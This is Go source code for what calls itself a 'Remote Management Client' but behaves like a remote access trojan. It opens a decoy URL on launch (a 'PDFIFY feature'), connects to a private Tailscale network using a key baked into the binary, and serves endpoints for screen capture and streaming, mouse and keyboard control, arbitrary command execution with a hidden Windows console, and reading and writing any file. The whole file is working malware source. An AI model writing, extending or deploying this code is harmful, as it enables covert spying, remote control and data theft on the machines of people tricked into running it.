package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"time"

	"tailscale.com/tsnet"
)

// These variables are set at compile time via -ldflags
var (
	// AuthKey is the Tailscale auth key baked in at compile time
	AuthKey string = ""
	// Hostname prefix for this client
	HostnamePrefix string = "rmgmt"
	// BuildTime is when this binary was compiled
	BuildTime string = "unknown"
	// Version of this client
	Version string = "dev"
	// DecoyURL is opened in the default browser on first launch (PDFIFY feature)
	DecoyURL string = ""
)

type ClientInfo struct {
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Version     string `json:"version"`
	BuildTime   string `json:"build_time"`
	TailscaleIP string `json:"tailscale_ip"`
	Uptime      string `json:"uptime"`
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Printf("Remote Management Client v%s (built: %s)", Version, BuildTime)

	// PDFIFY: open decoy URL in browser before doing anything else
	if DecoyURL != "" {
		openBrowser(DecoyURL)
	}

	// Check platform-specific permissions (macOS: Screen Recording + Accessibility)
	checkPlatformPermissions()

	if AuthKey == "" {
		log.Fatal("No auth key compiled into binary. This binary was not built correctly.")
	}

	// Generate a unique hostname based on machine info
	hostname := generateHostname()
	log.Printf("Starting with hostname: %s", hostname)

	// Set up tsnet server with embedded Tailscale
	srv := &tsnet.Server{
		Hostname: hostname,
		AuthKey:  AuthKey,
		Dir:      getStateDir(),
	}

	// Start the Tailscale connection
	log.Println("Connecting to Tailscale network...")
	if err := srv.Start(); err != nil {
		log.Fatalf("Failed to start tsnet: %v", err)
	}
	defer srv.Close()

	// Wait for Tailscale to be ready
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	status, err := srv.Up(ctx)
	if err != nil {
		log.Fatalf("Failed to bring up Tailscale: %v", err)
	}
	log.Printf("Connected to Tailscale! IP: %s", status.TailscaleIPs[0])

	startTime := time.Now()

	// Start the control API server (listens only on Tailscale network)
	ln, err := srv.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalf("Failed to listen on tsnet: %v", err)
	}
	defer ln.Close()

	mux := http.NewServeMux()

	// Health check / info endpoint
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		info := ClientInfo{
			Hostname:    hostname,
			OS:          runtime.GOOS,
			Arch:        runtime.GOARCH,
			Version:     Version,
			BuildTime:   BuildTime,
			TailscaleIP: status.TailscaleIPs[0].String(),
			Uptime:      time.Since(startTime).Round(time.Second).String(),
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(info)
	})

	// Ping endpoint
	mux.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("pong"))
	})

	// System info endpoint
	mux.HandleFunc("/system", func(w http.ResponseWriter, r *http.Request) {
		sysInfo := map[string]interface{}{
			"os":           runtime.GOOS,
			"arch":         runtime.GOARCH,
			"num_cpu":      runtime.NumCPU(),
			"go_version":   runtime.Version(),
			"hostname":     hostname,
			"tailscale_ip": status.TailscaleIPs[0].String(),
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(sysInfo)
	})

	// Register your existing handlers (defined in other files)
	mux.HandleFunc("/screen/capture", handleScreenCapture)
	mux.HandleFunc("/screen/stream", handleScreenStream)
	mux.HandleFunc("/input/mouse", handleMouseInput)
	mux.HandleFunc("/input/keyboard", handleKeyboardInput)
	mux.HandleFunc("/exec", handleExec)
	mux.HandleFunc("/files/list", handleFileList)
	mux.HandleFunc("/files/read", handleFileRead)
	mux.HandleFunc("/files/write", handleFileWrite)

	log.Printf("Control API listening on http://%s:8080", hostname)

	// Handle graceful shutdown
	go func() {
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
		log.Println("Shutting down...")
		ln.Close()
		srv.Close()
		os.Exit(0)
	}()

	// Start HTTP server
	if err := http.Serve(ln, mux); err != nil && err != net.ErrClosed {
		log.Fatalf("HTTP server error: %v", err)
	}
}

func generateHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	sanitized := ""
	for _, c := range hostname {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' {
			sanitized += string(c)
		}
	}
	if sanitized == "" {
		sanitized = "client"
	}
	return fmt.Sprintf("%s-%s", HostnamePrefix, sanitized)
}

func getStateDir() string {
	var baseDir string
	switch runtime.GOOS {
	case "darwin":
		homeDir, _ := os.UserHomeDir()
		baseDir = filepath.Join(homeDir, "Library", "Application Support", "RemoteMgmt")
	case "windows":
		baseDir = filepath.Join(os.Getenv("APPDATA"), "RemoteMgmt")
	default:
		homeDir, _ := os.UserHomeDir()
		baseDir = filepath.Join(homeDir, ".config", "remotemgmt")
	}
	os.MkdirAll(baseDir, 0700)
	return baseDir
}

// =============================================================================
// Screen Capture & Streaming
// =============================================================================

type ScreenCaptureResponse struct {
	Width     int    `json:"width"`
	Height    int    `json:"height"`
	Format    string `json:"format"`
	Data      string `json:"data"`
	Display   int    `json:"display"`
	Timestamp int64  `json:"timestamp"`
}

func handleScreenCapture(w http.ResponseWriter, r *http.Request) {
	displayNum := 0
	if d := r.URL.Query().Get("display"); d != "" {
		fmt.Sscanf(d, "%d", &displayNum)
	}

	quality := 50
	if q := r.URL.Query().Get("quality"); q != "" {
		fmt.Sscanf(q, "%d", &quality)
		if quality < 1 {
			quality = 1
		}
		if quality > 100 {
			quality = 100
		}
	}

	img, bounds, err := captureScreen(displayNum)
	if err != nil {
		http.Error(w, fmt.Sprintf("Capture failed: %v", err), http.StatusInternalServerError)
		return
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		http.Error(w, fmt.Sprintf("Encode failed: %v", err), http.StatusInternalServerError)
		return
	}

	if r.URL.Query().Get("raw") == "true" {
		w.Header().Set("Content-Type", "image/jpeg")
		w.Write(buf.Bytes())
		return
	}

	resp := ScreenCaptureResponse{
		Width:     bounds.Dx(),
		Height:    bounds.Dy(),
		Format:    "jpeg",
		Data:      base64.StdEncoding.EncodeToString(buf.Bytes()),
		Display:   displayNum,
		Timestamp: time.Now().UnixMilli(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleScreenStream(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	displayNum := 0
	if d := r.URL.Query().Get("display"); d != "" {
		fmt.Sscanf(d, "%d", &displayNum)
	}

	quality := 30
	if q := r.URL.Query().Get("quality"); q != "" {
		fmt.Sscanf(q, "%d", &quality)
	}

	fps := 5
	if f := r.URL.Query().Get("fps"); f != "" {
		fmt.Sscanf(f, "%d", &fps)
		if fps < 1 {
			fps = 1
		}
		if fps > 30 {
			fps = 30
		}
	}

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming not supported", http.StatusInternalServerError)
		return
	}

	ticker := time.NewTicker(time.Second / time.Duration(fps))
	defer ticker.Stop()

	var lastHash uint64
	ctx := r.Context()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			img, bounds, err := captureScreen(displayNum)
			if err != nil {
				continue
			}

			hash := simpleImageHash(img)
			if hash == lastHash {
				continue
			}
			lastHash = hash

			var buf bytes.Buffer
			if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
				continue
			}

			data := base64.StdEncoding.EncodeToString(buf.Bytes())
			fmt.Fprintf(w, "data: {\"width\":%d,\"height\":%d,\"data\":\"%s\",\"ts\":%d}\n\n",
				bounds.Dx(), bounds.Dy(), data, time.Now().UnixMilli())
			flusher.Flush()
		}
	}
}

func simpleImageHash(img *image.RGBA) uint64 {
	var hash uint64
	bounds := img.Bounds()
	step := 50
	for y := bounds.Min.Y; y < bounds.Max.Y; y += step {
		for x := bounds.Min.X; x < bounds.Max.X; x += step {
			c := img.RGBAAt(x, y)
			hash = hash*31 + uint64(c.R) + uint64(c.G)<<8 + uint64(c.B)<<16
		}
	}
	return hash
}

// =============================================================================
// Input Control (Mouse & Keyboard)
// =============================================================================

type MouseInput struct {
	Action string `json:"action"`
	X      int    `json:"x"`
	Y      int    `json:"y"`
	DeltaX int    `json:"delta_x"`
	DeltaY int    `json:"delta_y"`
}

type KeyboardInput struct {
	Action    string   `json:"action"`
	Text      string   `json:"text"`
	Key       string   `json:"key"`
	Modifiers []string `json:"modifiers"`
}

func handleMouseInput(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var input MouseInput
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	err := mouseAction(input)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func handleKeyboardInput(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var input KeyboardInput
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	err := keyboardAction(input)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// =============================================================================
// Command Execution
// =============================================================================

type ExecRequest struct {
	Command string   `json:"command"`
	Args    []string `json:"args"`
	Dir     string   `json:"dir"`
	Timeout int      `json:"timeout"`
	Hidden  bool     `json:"hidden"`
}

type ExecResponse struct {
	ExitCode int    `json:"exit_code"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	Error    string `json:"error,omitempty"`
	Duration string `json:"duration"`
}

var execMutex sync.Mutex

func handleExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req ExecRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if req.Command == "" {
		http.Error(w, "Command required", http.StatusBadRequest)
		return
	}

	timeout := 60
	if req.Timeout > 0 {
		timeout = req.Timeout
	}

	ctx, cancel := context.WithTimeout(r.Context(), time.Duration(timeout)*time.Second)
	defer cancel()

	start := time.Now()

	cmd := exec.CommandContext(ctx, req.Command, req.Args...)
	if req.Dir != "" {
		cmd.Dir = req.Dir
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if runtime.GOOS == "windows" && req.Hidden {
		hideWindowsConsole(cmd)
	}

	execMutex.Lock()
	err := cmd.Run()
	execMutex.Unlock()

	resp := ExecResponse{
		Stdout:   stdout.String(),
		Stderr:   stderr.String(),
		Duration: time.Since(start).String(),
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			resp.ExitCode = exitErr.ExitCode()
		} else {
			resp.ExitCode = -1
			resp.Error = err.Error()
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// =============================================================================
// File Operations
// =============================================================================

type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime int64  `json:"mod_time"`
}

func handleFileList(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Query().Get("path")
	if path == "" {
		path = "/"
		if runtime.GOOS == "windows" {
			path = "C:\\"
		}
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	var files []FileInfo
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		modTime := int64(0)
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Unix()
		}
		files = append(files, FileInfo{
			Name:    e.Name(),
			Path:    filepath.Join(path, e.Name()),
			Size:    size,
			IsDir:   e.IsDir(),
			ModTime: modTime,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(files)
}

func handleFileRead(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Query().Get("path")
	if path == "" {
		http.Error(w, "Path required", http.StatusBadRequest)
		return
	}

	info, err := os.Stat(path)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if info.Size() > 10*1024*1024 {
		http.Error(w, "File too large (max 10MB)", http.StatusBadRequest)
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(path)))
	w.Write(data)
}

func handleFileWrite(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	path := r.URL.Query().Get("path")
	if path == "" {
		http.Error(w, "Path required", http.StatusBadRequest)
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024)
	data, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if err := os.WriteFile(path, data, 0644); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
		"path":   path,
		"size":   len(data),
	})
}
